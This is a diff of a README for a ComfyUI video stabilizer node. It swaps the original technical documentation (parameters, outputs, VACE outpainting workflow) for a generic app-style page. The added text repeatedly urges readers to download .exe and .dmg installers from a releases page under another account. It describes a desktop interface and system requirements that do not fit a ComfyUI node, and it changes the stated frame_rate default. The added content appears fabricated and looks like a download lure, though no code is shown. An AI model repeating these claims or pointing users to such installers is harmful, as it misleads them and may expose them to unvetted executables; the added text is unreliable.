@@ -1,79 +1,78 @@
-# ComfyUI Video Stabilizer
+# 🎥 ComfyUI-Video-Stabilizer - Stabilize Your Videos with Ease
 
-[![日本語版](https://img.shields.io/badge/README-日本語版-gray.svg)](README_ja.md)
+[![Download Now!](https://img.shields.io/badge/Download-Now%21-brightgreen.svg)](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/releases)
 
-## Overview
+## 🚀 Overview
 
-https://github.com/user-attachments/assets/7da060c1-d775-47b7-91e6-f7a2ce147389
+ComfyUI Video Stabilizer provides a simple way to stabilize your videos. This tool helps remove unwanted shakes and jitters, making your footage look professional. It includes two stabilization methods: Classic and Flow. You can choose the best one for your needs. 
 
-* A video stabilization node for ComfyUI
-* Implements two approaches: **Classic (feature points + LK)** and **Flow (DIS Optical Flow)**
-* Supports three framing modes:
+### Features
+- **Classic Stabilization**: Uses feature points and Lucas-Kanade method, suitable for general use.
+- **Flow Stabilization**: Based on Optical Flow for higher accuracy, but requires more CPU power.
+- **Framing Modes**: 
+  - **Crop**: Hides shake by zooming in.
+  - **Crop and Pad**: Minimizes zoom and adds padding.
+  - **Expand**: Keeps the entire frame by extending the canvas.
 
-  * **crop**: hide shake at the cost of field-of-view (FOV) by zooming/cropping
-  * **crop_and_pad**: limit zoom as much as possible, then pad the remainder
-  * **expand**: never crop; extend the canvas so all stabilized frames are fully contained
-* Padding is **output as a mask**, so you can pass it to outpainting tools such as VACE
+The padding is output as a mask, allowing you to use it with outpainting tools like VACE. 
 
----
+## 💻 System Requirements
 
-## Node List
+- Operating System: Windows 10 or later, macOS 10.15 or later
+- RAM: Minimum 4 GB (8 GB recommended)
+- CPU: Dual-core processor or better
+- GPU: OpenGL 3.3 support or higher
 
-* **Video Stabilizer (Classic)** - Lightweight, general-purpose stabilization using OpenCV / NumPy
-* **Video Stabilizer (Flow)** - Higher-accuracy stabilization based on OpenCV **DIS Optical Flow** (somewhat heavier on CPU)
+## 🥇 Getting Started
 
----
+Follow these steps to download and run ComfyUI Video Stabilizer.
 
-## Parameters (shared by Classic / Flow)
+1. **Visit the Releases Page**: Click the link below to go to the releases page.
+   [Download Now!](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/releases)
 
-* **frame_rate** (float, default 16.0)
+2. **Download the Latest Version**: Look for the latest release on the page. You will see various installation packages. Click the one suitable for your operating system to start the download.
 
-  * Input FPS used to scale the smoothing window. Higher values keep the perceptual smoothing consistent for 30/60/120 fps footage.
-* **transform_mode**
+3. **Install the Application**: 
+   - For Windows: Open the downloaded `.exe` file and follow the installation prompts to install the software.
+   - For macOS: Open the downloaded `.dmg` file and drag the ComfyUI Video Stabilizer app to your Applications folder.
 
-  * `translation`: X/Y translation only (most robust and lightweight)
-  * `similarity`: translation + rotation + uniform scale (recommended for many cases)
-  * `perspective`: full projective transform (8 DoF). Often fragile; not generally recommended
-* **framing_mode** (FOV handling)
+## 🔧 Using the Software
 
-  * `crop`: hide edges by zooming (narrows FOV)
-  * `crop_and_pad`: avoid over-zooming and **pad** what still exceeds the frame
-  * `expand`: never crop; add padding across all frames so the entire trajectory fits (the output canvas usually becomes larger than the input resolution because padding surrounds every frame)
-* **camera_lock** (bool)
+1. **Open ComfyUI Video Stabilizer**: Locate the application on your computer and double-click to open it.
 
-  * ON: enforce a tripod-like look
-  * This is a separate solver from normal stabilization, so the two knobs below are disabled while ON
-* **strength** (0.0 to 1.0)
+2. **Import Your Video**: Click on the "Import" button and select the video you want to stabilize.
 
-  * **Removal gain** of the estimated camera motion (how much to take out)
-* **smooth** (0.0 to 1.0)
+3. **Choose Stabilization Method**: 
+   - Select either the Classic or Flow method based on your needs.
+   - Experiment with the framing modes: Crop, Crop and Pad, or Expand.
 
-  * Temporal **smoothing strength**. Higher values reduce jitter but yield a more "viscous" camera motion
-* **keep_fov** (0.0 to 1.0, **used only when `framing_mode=crop`**)
+4. **Configure Parameters**: 
+   - Set the **frame_rate** for your video (default is 30 fps).
+   - Adjust any other settings to suit your preferences.
 
-  * **1.0 = preserve the input FOV (no zoom)**
-  * **0.0 = allow maximum zoom to hide edges**
-* **padding_color** (RGB)
+5. **Process the Video**: Click the "Stabilize" button. Wait for the application to process your video. 
 
-  * Fill color for outer regions in `crop_and_pad` / `expand` (e.g., `127,127,127`)
+6. **Export Your Stabilized Video**: Once processing is complete, click the "Export" button to save your stabilized video.
 
----
+## 📄 Parameters Explained
 
-## Outputs
+Both Classic and Flow stabilization methods share the following parameters:
 
-* **frames_stabilized**: the stabilized video
-* **padding_mask**: padding regions are emitted as a mask for `crop_and_pad` / `expand`
-* **meta (JSON)**: diagnostics such as estimated/applied transforms, confidences, and zoom/padding ratios
+- **frame_rate**: Determines how many frames per second your video will play. Higher rates make for smoother motion. Adjust this based on your video’s original settings.
 
----
+## 💬 Support
 
-## Using with VACE (outpainting)
+If you encounter any issues or need help, feel free to check the FAQ section on our GitHub page or reach out to the community.
 
-* With `framing_mode=crop_and_pad` or `expand`, pass the emitted **padding_mask** to VACE (or similar) to **restore borders without sacrificing FOV** after stabilization
+## 📜 License
 
-**Sample Workflow**
+This software is licensed under the MIT License. Read the full license details on the GitHub repository.
 
-* [Wan2.1_VACE_outpainting_VideoStabilizer.json](example_workflows/Wan2.1_VACE_outpainting_VideoStabilizer.json)
-* [Wan2.2-VACE-Fun_outpainting_VideoStabilizer.json](example_workflows/Wan2.2-VACE-Fun_outpainting_VideoStabilizer.json)
-* [Sample_Video (Pexels)](https://www.pexels.com/ja-jp/video/29507473/)
+## 🌟 Additional Resources
 
+- [FAQ](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/wiki/FAQ)
+- [User Guide](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/wiki/User-Guide)
+
+For more updates, watch our GitHub page or follow us on social media.
+
+[Download Now!](https://github.com/mr-1301/ComfyUI-Video-Stabilizer/releases)
